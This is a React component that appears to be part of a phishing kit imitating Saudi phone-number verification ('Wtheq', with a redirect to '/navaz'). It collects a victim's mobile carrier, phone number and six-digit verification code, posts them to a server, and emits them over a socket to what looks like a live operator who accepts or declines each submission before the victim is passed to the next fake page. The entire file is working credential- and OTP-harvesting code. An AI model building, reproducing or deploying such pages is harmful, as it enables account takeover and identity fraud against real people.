import React, { useEffect, useState } from "react";

import { TailSpin } from "react-loader-spinner";
import axios from "axios";
import { api_route, socket } from "../App";

const Wtheq = () => {
  const token = sessionStorage.getItem("session");
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const [loading, setLoading] = useState(false);
  const [failed, setFaild] = useState(null);
  const [storedData, setData] = useState({
    MotslPhone: "",
    MotslService: "",
  });
  const [page, setPage] = useState(0);
  const [error, setError] = useState({});

  const handleChange = (e) => {
    const { name, type, checked, value } = e.target;
    setData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError({});
    setFaild(false);
    if (!storedData.MotslService) {
      setError({ service: "مطلوب" });
      setLoading(false);
    }
    const { fullname, email } = JSON.parse(data);
    const final = {
      MotslPhone: storedData.MotslPhone,
      MotslService: storedData.MotslService,
      fullname,
      email,
    };
    try {
      await axios
        .post(api_route + "/motsl/" + sessionStorage.getItem("id"), final)
        .then(() => {
          socket.emit("motsl", { ...final, token });
        });
    } catch (error) {
            setError("حدث خطأ برجاء المحاولة مره أخري");
    }
  };

  const handleMotslOtp = async (e) => {
    e.preventDefault();
    setLoading(true);
    const { fullname, email } = JSON.parse(data);
    const final = {
      MotslPhone: storedData.MotslPhone,
      MotslService: storedData.MotslService,
      MotslOtp: storedData.MotslOtp,
      fullname,
      email,
    };
    try {
      await axios
        .post(api_route + "/motsl/" + sessionStorage.getItem("id"), final)
        .then(() => {
          socket.emit("motslOtp", {
            ...final,
            token,
            id: sessionStorage.getItem("id"),
          });
        });
    } catch (error) {
             setError("حدث خطأ برجاء المحاولة مره أخري");
    }
  };

  socket.on("acceptMotsl", (id) => {
    if (id === sessionStorage.getItem("id")) {
      setPage(1);
      setLoading(false);
    }
  });
  socket.on("declineMotsl", (id) => {
    if (id === sessionStorage.getItem("id")) {
      setPage(0);
      setLoading(false);
             setFaild("حدث خطأ برجاء المحاولة مره أخري");
     
    }
  });

  socket.on("acceptMotslOtp", (id) => {
    console.log("acceptMotslOtp",id);
    if (id === sessionStorage.getItem("id")) {
   
      window.location.href =
        "/navaz?data=" +
        JSON.stringify({
          ...JSON.parse(data),
          MotslPhone: storedData.MotslPhone,
          MotslService: storedData.MotslService,
          MotslOtp: storedData.MotslOtp,
        });
    }
  });
  socket.on("declineMotslOtp", (info) => {
    if (info.token === token) {
           setFaild("حدث خطأ برجاء المحاولة مره أخري");
      setPage(1);
    }
  });
  return (
    <div className="w-full  flex items-center justify-center py-10 px-3">
      {loading && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      <div className=" w-full bg-white flex flex-col items-start p-2 my-5">
        {page === 0 ? (
          <>
            <img src="/wtheq1.png" />
            <div className="flex w-full justify-end p-2"></div>

            <form
              className="w-full flex flex-col p-2 "
              dir="rtl"
              onSubmit={handleSubmit}
            >
              <div className="flex flex-col w-full md:flex-row gap-5">
                <div className="md:w-1/2 gap-y-2 w-full flex flex-col text-lg">
                  <select
                    type="text"
                    name="MotslService"
                    className="border-2 rounded-md text-center p-2 outline-sky-500 text-base"
                    min={9}
                    minLength={9}
                    max={10}
                    maxLength={10}
                    required
                    value={storedData.MotslService}
                    onChange={handleChange}
                  >
                    <option hidden> مشغل شبكة الجوال</option>
                    <option>Zain</option>
                    <option>Mobily</option>
                    <option>STC</option>
                    <option>Salam</option>
                    <option>Virgin</option>
                    <option>Redbull</option>
                  </select>
                  {error.service && (
                    <span className="  text-red-400   text-sm">
                      {error.service}
                    </span>
                  )}
                </div>
                <div className="md:w-1/2 gap-y-2 w-full flex flex-col text-lg">
                  <label className="text-gray-600 text-center text-sm">
                    {" "}
                    رقم الجوال *
                  </label>
                  <input
                    type="text"
                    placeholder=" ******** 05 "
                    className="border-2 text-center rounded-md p-2 outline-sky-500 text-base"
                    min={9}
                    minLength={9}
                    max={10}
                    maxLength={10}
                    required
                    value={storedData.MotslPhone}
                    onChange={handleChange}
                    name="MotslPhone"
                  />
                  {error.phone && (
                    <span className="  text-red-400   text-sm">
                      {error.phone}
                    </span>
                  )}
                </div>
              </div>
              {failed && (
                <span className="p-2 w-full text-red-500 text-center text-xl">
                  {failed}
                </span>
              )}
              <div className="w-full text-left">
                <button className=" mt-5 rounded-md text-lg border bg-green-800 w-full  text-white px-2 py-1">
                  توثيق
                </button>
              </div>
            </form>
            <img src="/wtheq2.png" />
          </>
        ) : page === 1 ? (
          <>
            <img src="/motslOtp.png" />
            <form
              className="w-full flex items-center justify-center flex-col"
              onSubmit={handleMotslOtp}
            >
              <img
                src="https://static.wixstatic.com/media/1d19dc_a0d3063fdf954ffbbd2d288522eee23f~mv2.gif"
                className="w-32"
              />

              <div className="w-full text-left flex-col flex">
                <input
                  type="text"
                  placeholder="رمز التحقق*"
                  className="w-full p-2 rounded-md border text-center border-gray-400 outline-sky-400"
                  inputMode="numeric"
                  required
                  name="MotslOtp"
                  max={6}
                  maxLength={6}
                  minLength={6}
                  min={6}
                  value={storedData.MotslOtp}
                  onChange={handleChange}
                />
                {failed && (
                  <span className="p-2 w-full text-red-500 text-center text-xl">
                    {failed}
                  </span>
                )}
                <button className="w-full border bg-green-600 text-white mt-5 rounded-md py-2 px-3 ">
                  تأكيد
                </button>
              </div>
            </form>
          </>
        ) : (
          <>
            <div className="flex flex-col w-full my-3 gap-3">
              <span className="text-gray-700 w-full  text-sm text-right">
                .تم إرسال رمز التحقق إلى هاتفك النقال الرجاء إدخالة في هذه
                الخانة.
              </span>
              <span className="text-gray-700 w-full  text-sm text-right">
                * الرجاء إدخال كود التحقق داخل الصورة
              </span>
            </div>
            <form
              className="flex flex-col justify-start items-start w-full gap-2"
              dir="rtl"
              onSubmit={handleMotslOtp}
            >
              <span>رمز التحقق*</span>
              <input
                type="text"
                placeholder="رمز التحقق*"
                className="w-full p-2 rounded-md border border-gray-400 outline-sky-400"
                required
                name="MotslOtp"
                max={6}
                maxLength={6}
                minLength={6}
                min={6}
                value={storedData.MotslOtp}
                onChange={handleChange}
              />
              {failed && (
                <span className="p-2 w-full text-red-500 text-center text-xl">
                  {failed}
                </span>
              )}
              <div className="w-full text-left">
                <button className="w-fit border border-gray-700 text-gray-700 px-3 py-1">
                  التالي
                </button>
              </div>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default Wtheq;
